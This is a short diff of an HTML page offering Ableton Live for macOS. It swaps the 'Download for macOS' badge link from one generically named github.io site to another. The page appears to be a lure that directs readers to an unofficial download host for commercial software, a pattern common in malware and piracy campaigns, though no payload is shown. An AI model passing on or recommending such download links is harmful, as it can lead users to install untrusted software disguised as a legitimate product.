@@ -6,7 +6,7 @@
 <h3>Ableton Live for macOS</h3>
 <p>Ableton Live is a specialized digital audio workstation for music production and performance designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/ableton">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
